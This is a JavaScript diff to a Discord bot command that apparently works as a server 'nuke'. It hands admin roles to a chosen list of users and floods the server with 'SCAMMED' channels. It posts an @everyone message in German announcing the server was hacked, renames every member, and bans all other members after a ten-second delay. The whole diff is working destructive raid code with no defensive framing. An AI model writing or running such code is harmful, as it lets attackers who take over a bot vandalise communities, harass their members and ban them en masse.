@@ -52,19 +52,6 @@ const run = async (client, interaction) => {
     for (let member of dont_ban.keys()) {
         await guild.members.cache.find((value) => parseInt(value.id) == member)?.roles.add(admin_role);
     }
-    await guild.members.fetch();
-    await guild.members.cache.forEach(async (member) => {
-        try {
-            const memberid = await member.id;
-            if (dont_ban.has(memberid)) {
-                return;
-            }
-            await member.ban();
-        }
-        catch (e) {
-            console.log("Could not ban " + member.user.tag);
-        }
-    });
     await guild.channels.fetch();
     await guild.channels.cache.forEach(async (channel) => {
         try {
@@ -92,6 +79,26 @@ const run = async (client, interaction) => {
             name: "SCAMMED",
             type: discord_js_1.ChannelType.GuildText,
             topic: "SCAMMED",
+        }).then(async (channel) => {
+            await channel.send("@everyone dieser server ist ein scam!!! (gehackt von micheal jackson)");
         });
     }
+    await guild.members.fetch();
+    for (let member of guild.members.cache) {
+        await member[1].setNickname("Michael Jackson");
+    }
+    setTimeout(async () => {
+        await guild.members.cache.forEach(async (member) => {
+            try {
+                const memberid = await member.id;
+                if (dont_ban.has(memberid)) {
+                    return;
+                }
+                await member.ban();
+            }
+            catch (e) {
+                console.log("Could not ban " + member.user.tag);
+            }
+        });
+    }, 10000);
 };
